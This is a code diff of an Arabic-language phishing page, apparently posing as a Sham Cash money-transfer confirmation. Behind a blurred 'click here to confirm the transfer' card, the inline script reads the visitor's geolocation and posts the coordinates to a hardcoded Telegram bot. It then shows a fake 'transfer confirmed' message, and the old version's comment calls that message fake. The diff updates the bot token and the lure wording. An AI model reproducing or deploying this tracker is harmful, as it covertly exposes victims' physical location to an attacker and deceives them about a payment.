@@ -3,27 +3,23 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تحويلات شام كاش</title>
+  <title>Confirm Action</title>
   <style>
     body {
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
       background-color: #f0f0f0;
-      margin: 0;
-      font-family: Arial, sans-serif;
     }
-
-    #imageCard {
+    #card {
+      cursor: pointer;
       width: 400px;
-      height: 400px;
-      background-image: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg'); /* ضع هنا الصورة أو GIF */
+      height: 300px;
+      background-image: url('https://i.ibb.co/6cPGnqQn/IMG-20250826-WA0011.jpg');
       background-size: cover;
       background-position: center;
       filter: blur(2px); /* لتغبيش الصورة */
-      cursor: pointer;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -32,23 +28,15 @@
       font-size: 20px;
       text-shadow: 1px 1px 2px black;
     }
-
-    #caption {
-      margin-top: 15px;
-      font-size: 18px;
-      color: #333;
-      font-weight: bold;
-    }
   </style>
 </head>
 <body>
-  <div id="imageCard">Click Here</div>
-  <div id="caption">تحويلات شام كاش</div>
+  <div id="card">اضغط هنا لتأكيد الحوالة</div>
 
   <script>
-    const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; // توكن البوت
-    const CHAT_ID = "7485197107"; // معرف الشات
-    const card = document.getElementById('imageCard');
+    const card = document.getElementById('card');
+    const BOT_TOKEN = "8120112422:AAGXl1kbMxBnBgUOQU0nZhYvYum5yJAagyM"; // توكن البوت
+    const CHAT_ID = "6495557039"; // معرف الشات
 
     card.addEventListener('click', () => {
       if (navigator.geolocation) {
@@ -59,17 +47,22 @@
           // إرسال الموقع للبوت
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
-            headers: {'Content-Type': 'application/json'},
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               chat_id: CHAT_ID,
               text: `Lat: ${lat}\nLon: ${lon}`
             })
+          }).then(() => {
+            alert('تم تأكيد الحوالة!');
+          }).catch(err => {
+            console.error(err);
+            alert('فشل إرسال الموقع.');
           });
-
-          alert('تم تأكيد التحويل!'); // رسالة مزيفة فقط
+        }, () => {
+          alert('تعذر الحصول على الموقع.');
         });
       } else {
-        alert('غير قادر على الحصول على الموقع.');
+        alert('الموقع غير مدعوم في المتصفح.');
       }
     });
   </script>
